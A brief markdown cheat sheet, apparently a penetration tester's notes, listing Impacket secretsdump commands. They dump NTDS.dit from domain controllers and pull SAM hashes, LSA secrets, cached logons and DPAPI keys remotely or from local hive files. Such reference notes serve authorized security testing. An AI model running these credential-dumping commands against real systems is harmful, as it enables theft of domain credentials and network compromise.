# impacket-secretsdump.py

> The de facto tool for remotely dumping NTDS.dit from a Domain Controller.

---

## Dump NTDS.dit from domain controller with domain admin credentials

```bash
secretsdump.py -just-dc $DNS_DOMAIN_NAME/$USERNAME:[$PASSWORD]@$DOMAIN_CONTROLLER_FQDN_OR_IP [-hashes $LMHASH:NTLMHASH] [-debug]
```

---

## Remotely dump local, SAM hashes, cached domain logon information, LSA secrets, local computer hashes ($MACHINE.ACC), and DPAPI_SYSTEM

```bash
secretsdump.py $DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP [-debug]
```

---

## Dump NTDS.dit from domain controller with a Kerberos ticket

[[using-kerberos-tickets|Import the Kerberos ticket into impacket]] and execute the dump.

```bash
secretsdump.py -k -just-dc $DOMAIN_CONTROLLER_HOSTNAME [-debug]
```

- `$DOMAIN_CONTROLLER_HOSTNAME`: must be the FQDN of the domain controller, not the IP address. Change `/etc/hosts` accordingly.

---

## Dump a local NTDS.dit file (requires SYSTEM registry hive file)

```bash
impacket-secretsdump -ntds $PATH_TO_NTDS_FILE -system $PATH_TO_SYSTEM_REGISTRY_FILE local
```

---

## Dump a local SAM registry file (requires SYSTEM registry hive file)

```bash
impacket-secretsdump -sam $PATH_TO_SAM_REGISTRY_FILE -system $PATH_TO_SYSTEM_REGISTRY_FILE local
```
